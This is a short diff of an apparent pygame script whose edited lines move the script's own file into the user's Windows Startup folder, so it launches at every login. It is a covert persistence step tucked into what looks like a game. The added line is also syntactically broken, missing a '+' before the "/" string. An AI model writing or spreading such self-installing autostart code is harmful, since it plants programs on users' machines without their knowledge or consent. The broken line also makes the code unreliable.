@@ -5,10 +5,10 @@ import os
 import shutil
 import getpass
 
-print(os.path.basename(sys.argv[0]))
+FileName = os.path.basename(sys.argv[0])
 USER_NAME = getpass.getuser()
 FilePos = os.path.dirname(os.path.abspath(__file__))
-shutil.move(FilePos, 'C:/Users/' + USER_NAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+shutil.move(FilePos "/" + FileName, 'C:/Users/' + USER_NAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 
 
 pygame.font.init()
